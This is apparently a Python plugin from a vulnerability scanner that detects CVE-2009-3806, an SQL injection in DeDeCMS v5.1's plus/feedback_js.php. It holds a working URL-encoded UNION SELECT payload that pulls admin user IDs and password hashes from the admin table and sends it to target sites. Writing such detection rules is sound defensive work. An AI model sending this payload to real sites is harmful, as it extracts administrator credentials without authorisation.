#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from engine.engine_utils.rule_result_judge import page_similar


def run_domain(http,ob):
    '''
    CVE-2009-3806
    CNNVD-200910-394
    DeDeCMS v5.1“plus/feedback_js.php”SQL注入
    CWE-89	[SQL命令中使用的特殊元素转义处理不恰当（SQL注入）]
    '''
    result = []
    try:

        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []

        inj_path_list = [
            "/plus/feedback_js.php?arcurl=%cf%27%20union%20select%20%22%27" \
            "%20and%201=2%20union%20select%201,1,1,userid,3,1,3,3,pwd,1,1,3,1,1,1,1,1" \
            "%20as%20msg%20from%20yxwodede_admin%20where%201=1%20union%20select%20*%20from" \
            "%20yxwodede_feedback%20d%20where%201=2%20%20and%20%27%27=%27%22%20from%20yxwodede_admin%20where%20%27%27=%27",

            "/dede/plus/feedback_js.php?arcurl=%cf%27%20union%20select%20%22%27" \
            "%20and%201=2%20union%20select%201,1,1,userid,3,1,3,3,pwd,1,1,3,1,1,1,1,1" \
            "%20as%20msg%20from%20yxwodede_admin%20where%201=1%20union%20select%20*%20from" \
            "%20yxwodede_feedback%20d%20where%201=2%20%20and%20%27%27=%27%22%20from%20yxwodede_admin%20where%20%27%27=%27"
        ]

        for inj_path in inj_path_list:
            new_url = "%s://%s%s" % (scheme, domain, inj_path)
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.get('status') == '200' and re.search(r'<h2>(.*?)</h2>', content):
            # if res and res.get('status') == '200' and content:
                if page_similar(res.get('status'), content, ob.get('404_page')):
                    continue
                if page_similar(res.get('status'), content, ob.get('waf_page')):
                    continue
                detail = "检测到织梦CMS'feedback_js.php'SQL注入漏洞"
                request = getRequest(new_url, domain=ob['domain'])
                response = getResponse(res, content)
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:DedeCms5_1Feedback_jsSqlInjectionScript_yd.py, run_domain function :%s" % (str(e)))

    return result

